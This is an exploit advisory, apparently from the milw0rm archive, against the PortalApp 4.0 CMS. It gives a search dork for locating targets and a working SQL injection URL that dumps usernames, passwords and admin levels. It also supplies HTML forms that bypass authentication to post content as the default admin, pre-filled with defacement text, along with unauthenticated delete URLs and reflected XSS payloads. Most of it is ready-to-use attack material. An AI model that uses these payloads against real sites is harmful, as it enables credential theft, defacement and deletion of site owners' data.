<html><head><title>PortalApp 4.0 (SQL/XSS/Auth Bypasses) Multiple Remote Vulnerabilities</title></head><pre>##############################################################################
#Title: PortalApp 4.0 Multiple vulnerabilities                               #
#                                                                            #
#Discovered By: r3dm0v3                                                      #
#               http://r3dm0v3.persianblog.ir                                #
#               r3dm0v3( 4t }yahoo[dot}com                                   #
#               Tehran - Iran                                                #
#                                                                            #
#Vendor: http://www.portalapp.com                                            #
#Vulnerable Version: 4.0, prior versions maybe vulnerable                    #
#Remote Exploit: Yes                                                         #
#Dork: &quot;Copyright @2007 Iatek LLC&quot;                                           #
#Fix: Not Available                                                          #
##############################################################################

##############################################################################
#                       SQL Injection (CRITICAL)                             #
##############################################################################
#Description:
PortalApp is a Content Management System (CMS) for websites.
Bug: The user input 'sortby' is directly used in query statement!

#Exploit:
http://site.com/forums.asp?keywords=r3dm0v3&amp;do_search=1&amp;sortby=users.user_name+UNION+SELECT+1,2,3,4,5,password,user_name,8,9,10,user_id,accesslevel,13,14,15+FROM+Users

author will be usernames
topic will be passwords
replies will be username IDs
views will be access levels (5 is super admin)


##############################################################################
# Following actions in 'forum.asp' can take done without any authentication. #
##############################################################################
create a forum:
&lt;html&gt;
&lt;form action=http://site.com/forums.asp?action=insert_level1_edit_disc_forums method=post&gt;
 userid:&lt;input type=text name=user_id value=255&gt;by default 255 is sa&lt;br&gt;
 ForumName:&lt;input type=text name=ForumName value=&quot;H4c|&lt;3d bY r3dm0v3&quot;&gt;&lt;br&gt;
 Description:&lt;input type=text name=Description value=&quot;r3dm0v3 was here. &lt;a href=http://r3dm0v3.persianblog.ir&gt;http://r3dm0v3.persianblog.ir&lt;/a&gt;&quot;&gt;&lt;br&gt;
 ForumSection:&lt;input type=text name=ForumSection value=&quot;Hacked&quot;&gt;&lt;br&gt;
 DisplayOrder:&lt;input type=text name=DisplayOrder value=1&gt;&lt;br&gt;
 &lt;input type=submit&gt;
&lt;/form&gt;
&lt;/html&gt;

create a topic:
&lt;html&gt;
&lt;form action=http://site.com/forums.asp?action=insert_level2_edit_disc_topics method=post&gt;
 userid:&lt;input type=text name=user_id value=255&gt;by default 255 is sa&lt;br&gt;
 ForumID:&lt;input type=text name=ForumId value=&gt;&lt;br&gt;
 Subject:&lt;input type=text name=Subject value=&quot;r3dm0v3.&quot;&gt;&lt;br&gt;
 Message:&lt;br&gt;&lt;textarea rows=3 cols=50 name=Message&gt;r3dm0v3 was here.&lt;/textarea&gt;&lt;br&gt;
 Icon:&lt;input type=text name=Icon value=14&gt;&lt;br&gt;
 Show Signature:&lt;input type=text name=Showsignature value=0&gt;&lt;br&gt;
 Notify:&lt;input type=text name=Notify &gt;&lt;br&gt;
 Locked:&lt;input type=text name=Locked value=1&gt;&lt;br&gt;
 Sticky:&lt;input type=text name=Sticky &gt;&lt;br&gt;
 Date:&lt;input type=text name=DateAdded value=&quot;6/1/2008&quot;&gt;&lt;br&gt;
 DateLast:&lt;input type=text name=DateLast value=&quot;6/1/2008&quot;&gt;&lt;br&gt;
 &lt;input type=submit&gt;
&lt;/form&gt;
&lt;/html&gt;

delete a forum: http://site.com/forums.asp?action=delete_level1_edit_disc_forums&amp;ForumId=[ForumID]
delete a topic: http://site.com/forums.asp?action=delete_level2_edit_disc_topics&amp;TopicId=[TopicID]
delete a reply: http://site.com/forums.asp?action=delete_level3_edit_disc_replies&amp;ReplyId=[ReplyID]
delete a topic reply: http://site.com/forums.asp?action=delete_level2_disc_replies&amp;TopicId=[TopicID]&amp;ReplyId=[ReplyID]

#There some other actions:
insert_level3_edit_disc_replies
insert_detail_disc_topics
update_level1_edit_disc_forums
update_level2_edit_disc_topics
update_level3_edit_disc_replies
update_detail_disc_topics
update_level2_disc_replies


##############################################################################
#Following actions in 'Content.asp' can take done without any authentication.#
##############################################################################
Add content:
&lt;html&gt;
&lt;form action=http://site.com/content.asp?action=insert_detail_default method=post&gt;
 userid:&lt;input type=text name=user_id value=255&gt;by default 255 is sa&lt;br&gt;
 ContentTypeID:&lt;input type=text name=ContentTypeID value=2&gt;1:general(company) 2:article 3:lin 4:news 5:announcement 6:download 7:gallery 8:faq ...&lt;br&gt;
 catID:&lt;input type=text name=CatID value=198&gt;&lt;br&gt;
 Date:&lt;input type=text name=DateAdded value=&quot;6/1/2008&quot;&gt;&lt;br&gt;
 Author:&lt;input type=text name=Author value=r3dm0v3&gt;&lt;br&gt;
 title:&lt;input type=text name=Title value=&quot;h4ck3d bY r3dm0v3&quot;&gt;&lt;br&gt;
 ShortDesc:&lt;br&gt;&lt;textarea rows=3 cols=50 name=ShortDesc&gt;r3dm0v3 was here.&lt;/textarea&gt;&lt;br&gt;
 LongDesc:&lt;br&gt;&lt;textarea rows=4 cols=50  name=LongDesc&gt;r3dm0v3 was here. http://r3dm0v3.persianblog.ir&lt;/textarea&gt;&lt;br&gt;
 relatedULR&lt;input type=text name=RelatedURL value=&quot;http://r3dm0v3.persianblog.ir&quot;&gt;&lt;br&gt;
 DownloadURL:&lt;input type=text name=DownloadURL&gt;&lt;br&gt;
 Filename:&lt;input type=text name=Filename&gt;&lt;br&gt;
 Thumbnail:&lt;input type=text name=Thumbnail&gt;&lt;br&gt;
 Image1:&lt;input type=text name=Image1&gt;&lt;br&gt;
 PrevContentID:&lt;input type=text name=PrevContentId&gt;&lt;br&gt;
 NextContentID:&lt;input type=text name=NextContentId&gt;&lt;br&gt;
 views:&lt;input type=text name=Impressions value=10000&gt;&lt;br&gt;
 AVGRating:&lt;input type=text name=AvgRating value=10000&gt;&lt;br&gt;
 &lt;input type=submit&gt;
&lt;/form&gt;
&lt;/html&gt;

'insert_detail_content' is also vulnerable. Use above html code for exploit


##############################################################################
#                                   XSS                                      #
##############################################################################
http://site.com/forums.asp?keywords=%27%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&amp;do_search=1
http://site.com/content.asp?ContentType=General&amp;keywords=%27%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&amp;do_search=1

# milw0rm.com [2008-01-06]</pre></html>